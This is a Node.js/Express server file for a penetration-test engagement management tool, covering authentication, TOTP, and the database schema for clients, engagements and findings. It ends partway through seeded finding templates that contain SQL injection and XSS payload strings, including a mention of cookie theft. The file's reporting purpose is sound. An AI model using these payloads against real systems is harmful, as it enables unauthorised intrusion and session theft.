// Copyright (c) 2026 Eduardo Emiliano Alaniz - 
// SPDX-License-Identifier: AGPL-3.0-only
// https://github.com/allsafe-ar/gungnir-community

"use strict";
const path = require("path");
require("dotenv").config({ path: path.join(__dirname, ".env") });

const express  = require("express");
const jwt      = require("jsonwebtoken");
const bcrypt   = require("bcryptjs");
const cors     = require("cors");
const helmet   = require("helmet");
const mysql    = require("mysql2/promise");
const { v4: uuidv4 } = require("uuid");
const multer   = require("multer");
const fs       = require("fs");
const rateLimit = require("express-rate-limit");
const AdmZip   = require("adm-zip");

// ── Integration modules ───────────────────────────────────────────────────────
const reconInt   = require("./integrations/recon");

const UPLOADS_DIR = path.join(__dirname, "..", "uploads");
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });

// ── Config ────────────────────────────────────────────────────────────────────
const PORT       = process.env.PORT       || 3006;
const JWT_SECRET = process.env.JWT_SECRET || "gungnir_jwt_CHANGE_IN_PROD";

if (!process.env.JWT_SECRET || JWT_SECRET === "gungnir_jwt_CHANGE_IN_PROD") {
  console.error("[GUNGNIR] FATAL: JWT_SECRET no configurado. Configuralo en .env");
  process.exit(1);
}

// ── DB ────────────────────────────────────────────────────────────────────────
const db = mysql.createPool({
  host:            process.env.DB_HOST     || "localhost",
  user:            process.env.DB_USER     || "allsafe_gungnir",
  password:        process.env.DB_PASSWORD || "",
  database:        process.env.DB_NAME     || "allsafe_gungnir",
  waitForConnections: true,
  connectionLimit: 10,
  charset:         "utf8mb4",
});

const qRows = async (sql, p) => { const [r] = await db.execute(sql, p||[]); return r; };
const qRow  = async (sql, p) => { const r = await qRows(sql, p); return r[0]||null; };
const qRun  = (sql, p)       => db.execute(sql, p||[]);

// ── Audit log helper ──────────────────────────────────────────────────────────
async function auditLog(userId, username, action, entity, entityId, detail, ip) {
  try {
    await qRun(
      "INSERT INTO audit_logs (id,user_id,username,action,entity,entity_id,detail,ip) VALUES (?,?,?,?,?,?,?,?)",
      [uuidv4(), userId||null, username||null, action, entity||null, entityId||null, detail||null, ip||null]
    );
  } catch(e) { /* audit never breaks normal flow */ }
}

// ── Password policy ───────────────────────────────────────────────────────────
function validatePassword(pass) {
  if (!pass || pass.length < 8)    return "La contraseña debe tener al menos 8 caracteres.";
  if (!/[A-Z]/.test(pass))         return "Debe contener al menos una mayúscula.";
  if (!/[0-9]/.test(pass))         return "Debe contener al menos un número.";
  if (!/[^A-Za-z0-9]/.test(pass))  return "Debe contener al menos un carácter especial.";
  return null;
}

// ── TOTP (pure JS, RFC 6238) ──────────────────────────────────────────────────
const B32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
function base32ToBytes(s) {
  const str = s.toUpperCase().replace(/=+$/, "").replace(/[^A-Z2-7]/g, "");
  let bits = 0, val = 0; const out = [];
  for (const ch of str) {
    const idx = B32.indexOf(ch); if (idx === -1) continue;
    val = (val << 5) | idx; bits += 5;
    if (bits >= 8) { bits -= 8; out.push((val >> bits) & 0xff); val &= (1 << bits) - 1; }
  }
  return Buffer.from(out);
}
function sha1(data) {
  let h0=0x67452301,h1=0xEFCDAB89,h2=0x98BADCFE,h3=0x10325476,h4=0xC3D2E1F0;
  const msg=Array.from(data),len=msg.length; msg.push(0x80);
  while(msg.length%64!==56)msg.push(0);
  const bits=len*8;
  for(let i=7;i>=0;i--)msg.push(Math.floor(bits/Math.pow(256,i))&0xff);
  for(let i=0;i<msg.length;i+=64){
    const w=[];
    for(let j=0;j<16;j++)w[j]=(msg[i+j*4]<<24)|(msg[i+j*4+1]<<16)|(msg[i+j*4+2]<<8)|msg[i+j*4+3];
    for(let j=16;j<80;j++){const n=w[j-3]^w[j-8]^w[j-14]^w[j-16];w[j]=(n<<1)|(n>>>31);}
    let a=h0,b=h1,c=h2,d=h3,e=h4;
    for(let j=0;j<80;j++){
      let f,k;
      if(j<20){f=(b&c)|(~b&d);k=0x5A827999}else if(j<40){f=b^c^d;k=0x6ED9EBA1}
      else if(j<60){f=(b&c)|(b&d)|(c&d);k=0x8F1BBCDC}else{f=b^c^d;k=0xCA62C1D6}
      const t=(((a<<5)|(a>>>27))+f+e+k+w[j])|0;
      e=d;d=c;c=(b<<30)|(b>>>2);b=a;a=t;
    }
    h0=(h0+a)|0;h1=(h1+b)|0;h2=(h2+c)|0;h3=(h3+d)|0;h4=(h4+e)|0;
  }
  const r=Buffer.alloc(20);
  [h0,h1,h2,h3,h4].forEach((h,i)=>{r[i*4]=(h>>>24)&0xff;r[i*4+1]=(h>>>16)&0xff;r[i*4+2]=(h>>>8)&0xff;r[i*4+3]=h&0xff;});
  return r;
}
function hmacSha1(key,msg){
  let k=key.length>64?sha1(key):key;
  const kb=Buffer.alloc(64);k.copy(kb);
  const inner=sha1(Buffer.from([...kb.map(b=>b^0x36),...msg]));
  return sha1(Buffer.from([...kb.map(b=>b^0x5c),...inner]));
}
function totpCode(secret){
  const counter=Math.floor(Date.now()/1000/30);
  const key=base32ToBytes(secret);
  const msg=Buffer.alloc(8);
  const hi=Math.floor(counter/0x100000000),lo=counter>>>0;
  msg[0]=(hi>>>24)&0xff;msg[1]=(hi>>>16)&0xff;msg[2]=(hi>>>8)&0xff;msg[3]=hi&0xff;
  msg[4]=(lo>>>24)&0xff;msg[5]=(lo>>>16)&0xff;msg[6]=(lo>>>8)&0xff;msg[7]=lo&0xff;
  const sig=hmacSha1(key,msg);
  const offset=sig[19]&0x0f;
  const code=((sig[offset]&0x7f)*0x1000000)+((sig[offset+1]&0xff)*0x10000)+((sig[offset+2]&0xff)*0x100)+(sig[offset+3]&0xff);
  return(code%1000000).toString().padStart(6,"0");
}
function verifyTotp(secret, token) {
  for (let d = -1; d <= 1; d++) {
    const counter = Math.floor(Date.now()/1000/30) + d;
    const key = base32ToBytes(secret);
    const msg = Buffer.alloc(8);
    const hi=Math.floor(counter/0x100000000),lo=counter>>>0;
    msg[0]=(hi>>>24)&0xff;msg[1]=(hi>>>16)&0xff;msg[2]=(hi>>>8)&0xff;msg[3]=hi&0xff;
    msg[4]=(lo>>>24)&0xff;msg[5]=(lo>>>16)&0xff;msg[6]=(lo>>>8)&0xff;msg[7]=lo&0xff;
    const sig=hmacSha1(key,msg);
    const offset=sig[19]&0x0f;
    const code=((sig[offset]&0x7f)*0x1000000)+((sig[offset+1]&0xff)*0x10000)+((sig[offset+2]&0xff)*0x100)+(sig[offset+3]&0xff);
    if ((code%1000000).toString().padStart(6,"0") === token) return true;
  }
  return false;
}
function generateTotpSecret() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  let s = "";
  for (let i = 0; i < 32; i++) s += chars[Math.floor(Math.random() * chars.length)];
  return s;
}

// ── App ───────────────────────────────────────────────────────────────────────
const app = express();

const limiter = rateLimit({ windowMs: 15*60*1000, max: 200, standardHeaders: true, legacyHeaders: false });
app.use(limiter);

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'"],
      styleSrc:   ["'self'", "'unsafe-inline'"],
      imgSrc:     ["'self'", "data:", "blob:"],
    }
  }
}));
app.use(cors({
  origin: process.env.CORS_ORIGIN || (process.env.NODE_ENV === "production" ? false : "http://localhost:5176"),
  credentials: true,
}));
app.use(express.json({ limit: "2mb" }));

// ── Auth middleware ───────────────────────────────────────────────────────────
function auth(roles = []) {
  return async (req, res, next) => {
    const h = req.headers.authorization;
    if (!h?.startsWith("Bearer ")) return res.status(401).json({ error: "Sin token" });
    try {
      const decoded = jwt.verify(h.slice(7), JWT_SECRET);
      const user = await qRow(
        "SELECT id, username, email, full_name, role, token_version FROM users WHERE id=? AND is_active=1",
        [decoded.id]
      );
      if (!user || user.token_version !== decoded.tv) return res.status(401).json({ error: "Token inválido" });
      if (roles.length && !roles.includes(user.role)) return res.status(403).json({ error: "Sin permiso" });
      req.user = user;
      next();
    } catch { return res.status(401).json({ error: "Token inválido" }); }
  };
}

const upload = multer({ dest: UPLOADS_DIR, limits: { fileSize: 50*1024*1024 } });

// ── DB Init ───────────────────────────────────────────────────────────────────
async function initDB() {
  // Usuarios
  await qRun(`CREATE TABLE IF NOT EXISTS users (
    id VARCHAR(36) PRIMARY KEY,
    username VARCHAR(80) NOT NULL UNIQUE,
    email VARCHAR(120) NOT NULL UNIQUE,
    full_name VARCHAR(120) NOT NULL DEFAULT '',
    password_hash VARCHAR(255) NOT NULL,
    role ENUM('admin','auditor','pentester','lector') NOT NULL DEFAULT 'pentester',
    is_active TINYINT(1) NOT NULL DEFAULT 1,
    token_version INT NOT NULL DEFAULT 0,
    totp_secret VARCHAR(64),
    totp_enabled TINYINT(1) NOT NULL DEFAULT 0,
    failed_attempts INT NOT NULL DEFAULT 0,
    locked_until DATETIME,
    last_login DATETIME,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // Clientes
  await qRun(`CREATE TABLE IF NOT EXISTS clients (
    id VARCHAR(36) PRIMARY KEY,
    name VARCHAR(200) NOT NULL,
    industry VARCHAR(100),
    size ENUM('small','medium','large','enterprise'),
    country VARCHAR(100),
    contact_name VARCHAR(120),
    contact_email VARCHAR(120),
    contact_phone VARCHAR(50),
    exec_contact_name VARCHAR(120),
    exec_contact_email VARCHAR(120),
    nda_signed TINYINT(1) NOT NULL DEFAULT 0,
    nda_file VARCHAR(255),
    notes TEXT,
    created_by VARCHAR(36),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // Migración: columnas para integración CRM
  try { await qRun("ALTER TABLE clients ADD COLUMN crm_id VARCHAR(36) NULL"); } catch(_) {}
  try { await qRun("ALTER TABLE clients ADD COLUMN crm_synced_at DATETIME NULL"); } catch(_) {}

  // Engagements
  await qRun(`CREATE TABLE IF NOT EXISTS engagements (
    id VARCHAR(36) PRIMARY KEY,
    client_id VARCHAR(36) NOT NULL,
    title VARCHAR(200) NOT NULL,
    codename VARCHAR(80),
    type ENUM('external_pt','internal_pt','web_app','api','mobile','red_team','social_eng','physical') NOT NULL DEFAULT 'web_app',
    methodology ENUM('ptes','owasp_wstg','nist','red_team_mitre') NOT NULL DEFAULT 'ptes',
    status ENUM('planned','in_progress','reporting','qa','delivered','archived') NOT NULL DEFAULT 'planned',
    current_phase ENUM('planning','recon','scanning','exploitation','post_exploitation','reporting') DEFAULT 'planning',
    start_date DATE,
    end_date DATE,
    lead_id VARCHAR(36),
    rules_of_engagement TEXT,
    emergency_contacts JSON,
    auth_letter_file VARCHAR(255),
    notes TEXT,
    created_by VARCHAR(36),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE RESTRICT
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // Fases por engagement
  await qRun(`CREATE TABLE IF NOT EXISTS phases (
    id VARCHAR(36) PRIMARY KEY,
    engagement_id VARCHAR(36) NOT NULL,
    phase_type ENUM('planning','recon','scanning','exploitation','post_exploitation','reporting') NOT NULL,
    status ENUM('not_started','in_progress','completed') NOT NULL DEFAULT 'not_started',
    started_at DATETIME,
    completed_at DATETIME,
    notes TEXT,
    UNIQUE KEY uq_eng_phase (engagement_id, phase_type),
    FOREIGN KEY (engagement_id) REFERENCES engagements(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // Alcance
  await qRun(`CREATE TABLE IF NOT EXISTS scope_items (
    id VARCHAR(36) PRIMARY KEY,
    engagement_id VARCHAR(36) NOT NULL,
    type ENUM('ip','cidr','domain','url','application','other') NOT NULL DEFAULT 'domain',
    value VARCHAR(500) NOT NULL,
    in_scope TINYINT(1) NOT NULL DEFAULT 1,
    notes TEXT,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (engagement_id) REFERENCES engagements(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // Operation logs
  await qRun(`CREATE TABLE IF NOT EXISTS operation_logs (
    id VARCHAR(36) PRIMARY KEY,
    engagement_id VARCHAR(36) NOT NULL,
    phase_type ENUM('planning','recon','scanning','exploitation','post_exploitation','reporting') NOT NULL,
    logged_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    target VARCHAR(500),
    tool VARCHAR(100),
    command TEXT,
    notes TEXT,
    created_by VARCHAR(36),
    FOREIGN KEY (engagement_id) REFERENCES engagements(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // Hallazgos
  await qRun(`CREATE TABLE IF NOT EXISTS findings (
    id VARCHAR(36) PRIMARY KEY,
    engagement_id VARCHAR(36) NOT NULL,
    phase_type ENUM('planning','recon','scanning','exploitation','post_exploitation','reporting'),
    template_id VARCHAR(36),
    title VARCHAR(500) NOT NULL,
    description LONGTEXT,
    steps_to_reproduce LONGTEXT,
    affected_asset VARCHAR(500),
    cvss_vector_31 VARCHAR(100),
    cvss_score_31 DECIMAL(4,2),
    cvss_vector_40 VARCHAR(200),
    cvss_score_40 DECIMAL(4,2),
    severity ENUM('critical','high','medium','low','info') NOT NULL DEFAULT 'medium',
    business_risk ENUM('high','medium','low') DEFAULT 'medium',
    exploitability ENUM('proven','functional','poc','theoretical') DEFAULT 'theoretical',
    cwe_id VARCHAR(20),
    cwe_name VARCHAR(200),
    owasp_category VARCHAR(100),
    owasp_year VARCHAR(10),
    mitre_tactic VARCHAR(100),
    mitre_technique_id VARCHAR(20),
    mitre_technique_name VARCHAR(200),
    recommendation LONGTEXT,
    executive_summary TEXT,
    references_list JSON,
    status ENUM('open','in_remediation','fixed','accepted') NOT NULL DEFAULT 'open',
    created_by VARCHAR(36),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (engagement_id) REFERENCES engagements(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // Evidencias
  await qRun(`CREATE TABLE IF NOT EXISTS evidences (
    id VARCHAR(36) PRIMARY KEY,
    engagement_id VARCHAR(36) NOT NULL,
    finding_id VARCHAR(36),
    phase_type VARCHAR(30),
    filename VARCHAR(255) NOT NULL,
    original_name VARCHAR(255),
    file_type VARCHAR(100),
    file_size INT,
    caption TEXT,
    uploaded_by VARCHAR(36),
    uploaded_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (engagement_id) REFERENCES engagements(id) ON DELETE CASCADE,
    FOREIGN KEY (finding_id) REFERENCES findings(id) ON DELETE SET NULL
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // Equipo del engagement
  await qRun(`CREATE TABLE IF NOT EXISTS engagement_team (
    engagement_id VARCHAR(36) NOT NULL,
    user_id VARCHAR(36) NOT NULL,
    role ENUM('lead','pentester','reviewer') NOT NULL DEFAULT 'pentester',
    PRIMARY KEY (engagement_id, user_id),
    FOREIGN KEY (engagement_id) REFERENCES engagements(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  await qRun(`CREATE TABLE IF NOT EXISTS settings (
    \`key\`   VARCHAR(100) NOT NULL PRIMARY KEY,
    \`value\` TEXT,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  await qRun(`CREATE TABLE IF NOT EXISTS audit_logs (
    id         VARCHAR(36) NOT NULL PRIMARY KEY,
    user_id    VARCHAR(36),
    username   VARCHAR(80),
    action     VARCHAR(100) NOT NULL,
    entity     VARCHAR(80),
    entity_id  VARCHAR(36),
    detail     TEXT,
    ip         VARCHAR(64),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_created (created_at DESC),
    INDEX idx_user (user_id)
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // ── Migración de roles (lead→auditor, analyst→pentester, viewer→lector) ──────
  try {
    // Ampliar ENUM para que incluya valores viejos y nuevos simultáneamente
    await qRun(`ALTER TABLE users MODIFY COLUMN role ENUM('admin','lead','analyst','auditor','pentester','lector','viewer') NOT NULL DEFAULT 'pentester'`);
    await qRun(`UPDATE users SET role='auditor'   WHERE role='lead'`);
    await qRun(`UPDATE users SET role='pentester' WHERE role='analyst'`);
    await qRun(`UPDATE users SET role='lector'    WHERE role='viewer'`);
    await qRun(`ALTER TABLE users MODIFY COLUMN role ENUM('admin','auditor','pentester','lector') NOT NULL DEFAULT 'pentester'`);
  } catch(e) { /* ya migrado o no necesario */ }

  // ── Finding Templates ─────────────────────────────────────────────────────
  await qRun(`CREATE TABLE IF NOT EXISTS finding_templates (
    id VARCHAR(36) PRIMARY KEY,
    title VARCHAR(500) NOT NULL,
    category VARCHAR(100),
    severity ENUM('critical','high','medium','low','info') NOT NULL DEFAULT 'medium',
    description LONGTEXT,
    steps_to_reproduce LONGTEXT,
    recommendation LONGTEXT,
    cwe_id VARCHAR(20),
    cwe_name VARCHAR(200),
    owasp_category VARCHAR(100),
    cvss_vector_31 VARCHAR(100),
    cvss_score_31 DECIMAL(4,2),
    references_list JSON,
    is_builtin TINYINT(1) NOT NULL DEFAULT 0,
    created_by VARCHAR(36),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // ── API Keys ──────────────────────────────────────────────────────────────
  await qRun(`CREATE TABLE IF NOT EXISTS api_keys (
    id VARCHAR(36) PRIMARY KEY,
    name VARCHAR(200) NOT NULL,
    key_hash VARCHAR(255) NOT NULL,
    key_prefix VARCHAR(16) NOT NULL,
    user_id VARCHAR(36) NOT NULL,
    permissions JSON,
    last_used DATETIME,
    expires_at DATETIME,
    is_active TINYINT(1) NOT NULL DEFAULT 1,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // ── Custom phases (trabajos no-pentesting) ────────────────────────────────
  await qRun(`CREATE TABLE IF NOT EXISTS custom_phases (
    id VARCHAR(36) PRIMARY KEY,
    engagement_id VARCHAR(36) NOT NULL,
    name VARCHAR(200) NOT NULL,
    description TEXT,
    work_plan TEXT,
    status ENUM('not_started','in_progress','completed') NOT NULL DEFAULT 'not_started',
    order_index INT NOT NULL DEFAULT 0,
    created_by VARCHAR(36),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (engagement_id) REFERENCES engagements(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  await qRun(`CREATE TABLE IF NOT EXISTS custom_phase_docs (
    id VARCHAR(36) PRIMARY KEY,
    phase_id VARCHAR(36) NOT NULL,
    engagement_id VARCHAR(36) NOT NULL,
    filename VARCHAR(500) NOT NULL,
    original_name VARCHAR(500) NOT NULL,
    file_type VARCHAR(200),
    file_size INT,
    caption VARCHAR(500),
    uploaded_by VARCHAR(36),
    uploaded_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (phase_id) REFERENCES custom_phases(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  await qRun(`CREATE TABLE IF NOT EXISTS custom_phase_updates (
    id VARCHAR(36) PRIMARY KEY,
    phase_id VARCHAR(36) NOT NULL,
    content TEXT NOT NULL,
    created_by VARCHAR(36),
    author_name VARCHAR(100),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (phase_id) REFERENCES custom_phases(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // Imágenes adjuntas a actualizaciones
  await qRun(`CREATE TABLE IF NOT EXISTS custom_phase_update_images (
    id VARCHAR(36) PRIMARY KEY,
    update_id VARCHAR(36) NOT NULL,
    filename VARCHAR(500) NOT NULL,
    original_name VARCHAR(500) NOT NULL,
    file_size INT,
    uploaded_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (update_id) REFERENCES custom_phase_updates(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // Técnicas / herramientas utilizadas en un engagement
  await qRun(`CREATE TABLE IF NOT EXISTS engagement_techniques (
    id VARCHAR(36) PRIMARY KEY,
    engagement_id VARCHAR(36) NOT NULL,
    custom_phase_id VARCHAR(36),
    phase_type VARCHAR(50),
    mitre_id VARCHAR(20),
    name VARCHAR(200) NOT NULL,
    tactic VARCHAR(100),
    tool VARCHAR(200),
    notes TEXT,
    added_by VARCHAR(36),
    added_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (engagement_id) REFERENCES engagements(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // ── Scripts custom ───────────────────────────────────────────────────────
  await qRun(`CREATE TABLE IF NOT EXISTS scripts (
    id VARCHAR(36) PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    category VARCHAR(100) NOT NULL DEFAULT 'General',
    platform ENUM('linux','windows','cross') NOT NULL DEFAULT 'linux',
    language ENUM('bash','powershell','python','batch') NOT NULL DEFAULT 'bash',
    content LONGTEXT NOT NULL,
    mitre_ids JSON,
    related_tools JSON,
    tags JSON,
    notes TEXT,
    severity ENUM('info','low','medium','high','critical') NOT NULL DEFAULT 'info',
    script_type ENUM('detection','exploitation','enum','privesc','persistence','lateral','exfil','wireless') NOT NULL DEFAULT 'detection',
    created_by VARCHAR(36),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // ── Arsenal custom ────────────────────────────────────────────────────────
  await qRun(`CREATE TABLE IF NOT EXISTS arsenal_tools (
    id VARCHAR(36) PRIMARY KEY,
    key_name VARCHAR(100) UNIQUE NOT NULL,
    label VARCHAR(255) NOT NULL,
    description TEXT,
    arsenal_cat VARCHAR(50) NOT NULL DEFAULT 'util',
    kali ENUM('yes','partial','no') NOT NULL DEFAULT 'no',
    created_by VARCHAR(36),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  await qRun(`CREATE TABLE IF NOT EXISTS arsenal_commands (
    id VARCHAR(36) PRIMARY KEY,
    tool_key VARCHAR(100) NOT NULL,
    phase ENUM('recon','scanning','exploitation','post_exploitation','general') NOT NULL DEFAULT 'general',
    category VARCHAR(255) NOT NULL DEFAULT 'General',
    title VARCHAR(255) NOT NULL,
    command TEXT NOT NULL,
    description TEXT,
    tags JSON,
    notes TEXT,
    mitre_id VARCHAR(20),
    created_by VARCHAR(36),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // ── Overrides de built-ins ────────────────────────────────────────────────
  await qRun(`CREATE TABLE IF NOT EXISTS cmd_overrides (
    item_id VARCHAR(100) PRIMARY KEY,
    title VARCHAR(255),
    command TEXT,
    description TEXT,
    phase VARCHAR(50),
    category VARCHAR(255),
    tags JSON,
    notes TEXT,
    mitre_id VARCHAR(20),
    hidden TINYINT(1) NOT NULL DEFAULT 0,
    updated_by VARCHAR(36),
    updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (updated_by) REFERENCES users(id) ON DELETE SET NULL
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  await qRun(`CREATE TABLE IF NOT EXISTS script_overrides (
    item_id VARCHAR(100) PRIMARY KEY,
    name VARCHAR(255),
    description TEXT,
    category VARCHAR(100),
    platform ENUM('linux','windows','cross'),
    language ENUM('bash','powershell','python','batch'),
    content LONGTEXT,
    mitre_ids JSON,
    related_tools JSON,
    tags JSON,
    notes TEXT,
    severity ENUM('info','low','medium','high','critical'),
    script_type ENUM('detection','exploitation','enum','privesc','persistence','lateral','exfil','wireless'),
    hidden TINYINT(1) NOT NULL DEFAULT 0,
    updated_by VARCHAR(36),
    updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (updated_by) REFERENCES users(id) ON DELETE SET NULL
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // ── Notas personales ──────────────────────────────────────────────────────
  await qRun(`CREATE TABLE IF NOT EXISTS notes (
    id          VARCHAR(36)  NOT NULL PRIMARY KEY,
    user_id     VARCHAR(36)  NOT NULL,
    title       VARCHAR(255) NOT NULL,
    content     LONGTEXT,
    tags        JSON,
    is_pinned   TINYINT(1)   NOT NULL DEFAULT 0,
    engagement_id VARCHAR(36) DEFAULT NULL,
    created_at  DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at  DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (engagement_id) REFERENCES engagements(id) ON DELETE SET NULL
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // ── Note shares ───────────────────────────────────────────────────────────
  await qRun(`CREATE TABLE IF NOT EXISTS note_shares (
    note_id    VARCHAR(36) NOT NULL,
    user_id    VARCHAR(36) NOT NULL,
    created_at DATETIME    NOT NULL DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (note_id, user_id),
    FOREIGN KEY (note_id) REFERENCES notes(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
  ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);

  // ── Migración: engagements mode + tipos ampliados ─────────────────────────
  try {
    await qRun(`ALTER TABLE engagements ADD COLUMN mode VARCHAR(20) NOT NULL DEFAULT 'pentesting'`);
  } catch(e) { /* columna ya existe */ }
  try {
    await qRun(`ALTER TABLE engagements MODIFY COLUMN type VARCHAR(50) NOT NULL DEFAULT 'web_app'`);
  } catch(e) { /* ya migrado */ }
  try {
    await qRun(`ALTER TABLE engagements MODIFY COLUMN methodology VARCHAR(50) NOT NULL DEFAULT 'ptes'`);
  } catch(e) { /* ya migrado */ }
  try {
    await qRun(`ALTER TABLE engagements MODIFY COLUMN current_phase VARCHAR(50) DEFAULT 'planning'`);
  } catch(e) { /* ya migrado */ }

  // ── Seed finding templates built-in ──────────────────────────────────────
  const tplCount = await qRow("SELECT COUNT(*) AS c FROM finding_templates WHERE is_builtin=1");
  if (!tplCount || tplCount.c == 0) {
    const tpls = [
      { title:"SQL Injection", category:"Injection", severity:"critical", cwe_id:"CWE-89", cwe_name:"Improper Neutralization of Special Elements used in an SQL Command", owasp:"A03:2021 – Injection", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score:9.8,
        desc:"La aplicación construye consultas SQL concatenando directamente datos controlados por el usuario sin sanitización ni parametrización. Esto permite a un atacante modificar la lógica de la consulta para extraer datos arbitrarios, eludir autenticación o ejecutar operaciones destructivas en la base de datos.",
        steps:"1. Identificar parámetros de entrada reflejados en consultas SQL (formularios de login, búsqueda, filtros).\n2. Enviar payload básico: ' OR 1=1-- para verificar la vulnerabilidad.\n3. Usar sqlmap o técnica manual para enumerar tablas: ' UNION SELECT NULL,table_name FROM information_schema.tables-- \n4. Extraer credenciales u otros datos sensibles.",
        rec:"Usar consultas parametrizadas (prepared statements) en todos los accesos a base de datos. Implementar ORM con consultas tipadas. Aplicar principio de mínimo privilegio en el usuario de base de datos. Validar y sanitizar toda entrada del usuario. Implementar WAF como capa adicional."},
      { title:"Cross-Site Scripting (XSS) Reflejado", category:"XSS", severity:"high", cwe_id:"CWE-79", cwe_name:"Improper Neutralization of Input During Web Page Generation", owasp:"A03:2021 – Injection", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", score:6.1,
        desc:"La aplicación refleja datos de entrada del usuario en la respuesta HTML sin codificación adecuada, permitiendo la inyección y ejecución de código JavaScript arbitrario en el navegador de la víctima.",
        steps:"1. Identificar parámetros reflejados en la respuesta: ?q=test, campos de búsqueda, mensajes de error.\n2. Inyectar payload básico: <script>alert(1)</script>\n3. Probar bypass de filtros: <img src=x onerror=alert(1)>, <svg onload=alert(1)>\n4. Demostrar impacto: robo de cookies de sesión con document.cookie",
